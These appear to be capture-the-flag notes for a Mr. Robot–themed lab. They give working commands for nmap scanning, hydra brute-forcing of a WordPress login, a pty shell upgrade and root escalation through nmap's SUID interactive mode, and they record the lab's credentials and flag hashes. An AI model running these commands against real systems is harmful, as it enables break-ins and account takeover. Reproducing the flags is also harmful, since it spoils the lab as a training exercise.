# TASK 2

## [1] Nmap Scan

nmap -sV -O -T4 -Pn 10.10.102.122 -oN nmap/initial

Webserver running

## [2] Gobuster directory bruiteforcing

robots.txt

Secret 1 : 073403c8a58a1f80d943455fb30724b9

fsociety.txt found

wp-login.php found

## [3] Username bruiteforcing

hydra -L newFsocity.dic -p test 10.10.172.129 http-post-form "/wp-login.php:log=^USER^&pwd=test&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.172.129%2Fwp-admin%2F&testcookie=1:Invalid username"

Username : Elliot

## [4] Password bruitforcing

hydra -l Elliot -P newFsocity.dic 10.10.172.129 http-post-form "/wp-login.php:log=Elliot&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.172.129%2Fwp-admin%2F&testcookie=1:The password you entered for the username" -I -t 64

Password : ER28-0652

## [5] Username password for user robot

python -c "import pty; pty.spawn('/bin/bash')"

User : robot
Password : abcdefghijklmnopqrstuvwxyz

Secret 2 : 822c73956184f694993bede3eb39f959

## [6] Prev Esc

find / -type f -perm -u=s &2>/dev/null

nmap hase SUID bit set.

nmap --interactive

Now we have nmap shell with root priv.

!ls /root

!cat /root/key-3-of-3.txt

Secret 3 : 04787ddef27c3dee1ee161b21670b4e4